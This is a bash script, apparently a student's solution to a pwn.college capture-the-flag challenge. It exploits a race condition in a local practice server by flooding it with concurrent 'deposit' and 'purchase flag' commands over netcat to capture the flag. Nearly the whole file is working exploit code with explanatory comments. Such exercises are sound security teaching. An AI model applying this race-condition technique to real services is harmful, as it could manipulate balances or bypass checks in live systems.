#!/bin/bash
# Sumanth Vankineni
# UID 119351130
# PWN.COLLEGE - BULMAX9797

# This script exploits a race condition vulnerability in a server application
# that processes 'deposit', 'withdraw', and 'purchase flag' commands.
# The vulnerability stems from unsynchronized access to a global 'money' variable
# by multiple threads handling client connections, leading to unpredictable outcomes.

# Sets the server connection details where the binary is running, offering 'Deposit', 'Withdraw', and 'Purchase' options.
HOST='127.0.0.1'
PORT='1337'

# Defines the number of iterations to attempt the deposit and purchase operations, based on trial and error to accumulate sufficient funds.
ATTEMPTS=1000

# The exploit strategy involves sending concurrent 'deposit' commands followed by a 'purchase flag' command.
# The aim is to manipulate the 'money' variable to be high enough for the 'purchase flag' command to succeed,
# exploiting the race condition by having these commands processed simultaneously by different server threads.
for ((i=0; i<ATTEMPTS; i++)); do
    # Initiates a sub-process to execute two 'deposit' commands consecutively, aiming to increase the 'money' variable.
    # The commands are sent through netcat, simulating client deposits.
    # A brief sleep is introduced to ensure the server processes the commands before the connection is closed.
    (echo "deposit"; echo "deposit"; sleep 1) | nc $HOST $PORT | grep '^pwn' &

    # Almost simultaneously, another sub-process sends a 'purchase flag' command, aiming to exploit the momentarily high 'money' value.
    # The success of this operation depends on the race condition, allowing the purchase to go through if the 'money' variable has not been reset.
    # The script filters the output for a specific success indicator (assumed to start with 'pwn') to capture the flag.
    (echo "purchase flag"; sleep 1) | nc $HOST $PORT | grep '^pwn' &
done

# The script waits for all background processes to complete, ensuring that every deposit and purchase attempt is fully executed.
# This ensures a thorough exploitation attempt, maximizing the chances of successful flag retrieval.
wait

# The non-deterministic nature of thread scheduling and execution timing in the server application makes the exploit probabilistic.
# The script repeats the exploit attempts, leveraging the inherent unpredictability to eventually achieve the desired outcome.
